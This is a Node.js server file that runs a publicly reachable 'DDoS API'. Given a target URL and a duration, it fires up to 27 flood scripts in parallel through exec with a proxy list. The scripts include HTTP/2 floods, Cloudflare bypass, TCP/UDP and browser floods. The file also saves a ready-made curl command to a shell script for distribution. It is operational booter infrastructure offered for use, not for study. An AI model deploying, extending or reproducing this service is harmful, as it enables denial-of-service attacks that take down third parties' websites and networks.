const express = require('express');
const { exec } = require('child_process');
const async = require('async');
const sanitize = require('sanitize-filename');
const rateLimit = require('express-rate-limit');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 50036;
const scrapeProxies = require('./proxy.js');

// Rate limiting to prevent abuse
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit to 100 requests per IP per window
  message: { error: 'Too many requests, please try again later.' },
});

// Basic input validation
const validateInput = (target, attack_time, attack_all_method, port) => {
  if (!target || !/^https?:\/\/[\w\-.:]+/.test(target)) {
    return 'Invalid target URL (must start with http:// or https://)';
  }
  if (!attack_time || isNaN(attack_time) || attack_time < 1 || attack_time > 3600) {
    return 'Attack time must be a number between 1 and 3600 seconds';
  }
  if (attack_all_method !== 'all' && attack_all_method !== 'true' && attack_all_method !== 'false') {
    return 'attack_all_method must be "all", "true", or "false"';
  }
  if (port && (isNaN(port) || port < 1 || port > 65535)) {
    return 'Port must be a number between 1 and 65535';
  }
  return null;
};

// Fetch server info and generate API command
async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    const serverUrl = `http://${data.origin}:${port}`;
    console.log(`DDoS API Server running at: ${serverUrl}`);

    // Generate API command
    const apiCommand = `curl "${serverUrl}/ddos?target=<TARGET_URL>&attack_time=<SECONDS>&attack_all_method=all&port=${port}"`;
    console.log(`Generated API Command for public use:\n${apiCommand}`);
    console.log('Example usage:');
    console.log(`curl "${serverUrl}/ddos?target=https://example.com&attack_time=60&attack_all_method=all&port=${port}"`);

    // Save API command to a file for easy distribution
    const fs = require('fs');
    fs.writeFileSync('ddos_api.sh', `#!/bin/bash\n${apiCommand}\n`, 'utf8');
    console.log('API command saved to ddos_api.sh');

    return data;
  } catch (error) {
    console.error('Error fetching server data:', error);
  }
}

// Apply rate limiting to the DDoS endpoint
app.use('/ddos', apiLimiter);

// DDoS endpoint
app.get('/ddos', (req, res) => {
  const { target, attack_time, attack_all_method, port: inputPort } = req.query;

  // Validate inputs
  const validationError = validateInput(target, attack_time, attack_all_method, inputPort);
  if (validationError) {
    return res.status(400).json({ error: validationError });
  }

  // Sanitize inputs
  const safeTarget = sanitize(target);
  const safeTime = parseInt(attack_time, 10);
  const safePort = inputPort ? parseInt(inputPort, 10) : port;

  // Check if all methods should be executed
  const executeAll = attack_all_method === 'all' || attack_all_method === 'true';

  res.status(200).json({
    message: executeAll
      ? 'DDoS API request received. Initiating all attack methods concurrently.'
      : 'DDoS API request received. No methods executed (attack_all_method is false).',
    target: safeTarget,
    attack_time: safeTime,
    attack_all_method,
    port: safePort,
  });

  if (!executeAll) {
    console.log('Attack not executed: attack_all_method is not set to "all" or "true".');
    return;
  }

  // List of DDoS methods
  const methods = [
    { name: 'ninja', command: `node ./lib/cache/StarsXNinja.js ${safeTarget} ${safeTime}` },
    { name: 'bypass', command: `node methods/bypass.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'h2-fast', command: `node methods/h2-fast.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'httpp-mix', command: `node methods/HTTP-GECKO.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'pidoras', command: `node methods/pidoras.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'xyn', command: `node methods/xyn.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'destroy', command: `node methods/destroy.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'mix', command: `node methods/mix.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'gecko', command: `node methods/gecko.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'api', command: `node methods/api.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'cf', command: `node methods/c-f.js ${safeTarget} ${safeTime} 10 8` },
    { name: 'fire', command: `node methods/fire.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'glory', command: `node methods/glory.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'h2-meris', command: `node methods/H2-MERIS.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'browser', command: `node methods/browser.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'https', command: `node methods/https.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'h2-flood', command: `node methods/H2-FLOOD.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'bomb', command: `node methods/meriam.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'storm', command: `node methods/storm.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'star', command: `node methods/star.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'tcp', command: `node methods/tcp.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'udp', command: `node methods/udp.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'tcp-pps', command: `node methods/tcp-pps.c ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'ack-pps', command: `node methods/ack-pps.c ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'chap', command: `node methods/chap.js ${safeTarget} ${safeTime} 10 100 proxy.txt` },
    { name: 'tls', command: `node methods/tls.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
    { name: 'http-flood', command: `node methods/http-flod.js ${safeTarget} ${safeTime} 100 10 proxy.txt` },
  ];

  // Execute all methods with concurrency limit
  async.parallelLimit(
    methods.map(({ name, command }) => (cb) => {
      console.log(`Starting method: ${name}`);
      exec(command, { timeout: safeTime * 1000 + 5000 }, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error in ${name}: ${error.message}`);
          return cb(null, { name, error: error.message });
        }
        if (stderr) {
          console.error(`Stderr in ${name}: ${stderr}`);
          return cb(null, { name, stderr });
        }
        console.log(`Success in ${name}: ${stdout}`);
        cb(null, { name, output: stdout });
      });
    }),
    5, // Limit to 5 concurrent processes
    (err, results) => {
      if (err) {
        console.error('Error in parallel execution:', err);
      }
      console.log('DDoS methods execution completed:', results);
    }
  );
});

app.listen(port, () => {
  console.log(`DDoS API running on port ${port} (Publicly accessible)`);
  fetchData();
});